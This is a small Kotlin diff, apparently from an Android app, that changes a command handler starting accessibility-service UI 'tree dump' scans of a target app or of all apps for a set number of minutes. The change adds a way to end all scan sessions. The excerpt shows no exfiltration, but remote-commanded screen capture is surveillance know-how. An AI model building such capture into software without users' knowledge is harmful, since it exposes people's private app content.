@@ -195,9 +195,15 @@ object CommandProcessor {
                     val mins = (if (parts.size >= 2) parts[1].toLongOrNull() else parts[0].toLongOrNull()) ?: 5L
                     
                     if (MyAccessibilityService.instance != null) {
-                        MyAccessibilityService.instance?.startTreeDump(pkg, mins)
-                        status = "SCAN_SESSION_STARTED"
-                        errorMsg = "Target: ${pkg ?: "GLOBAL"} | Duration: ${mins}m"
+                        if (mins <= 0) {
+                            MyAccessibilityService.instance?.startTreeDump(null, 0)
+                            status = "SCAN_SESSION_TERMINATED"
+                            errorMsg = "All active UI scan sessions have been cleared."
+                        } else {
+                            MyAccessibilityService.instance?.startTreeDump(pkg, mins)
+                            status = "SCAN_SESSION_STARTED"
+                            errorMsg = "Target: ${pkg ?: "GLOBAL"} | Duration: ${mins}m"
+                        }
                     } else {
                         status = "FAILED (SERVICE_OFF)"
                         errorMsg = "Accessibility service is not running."
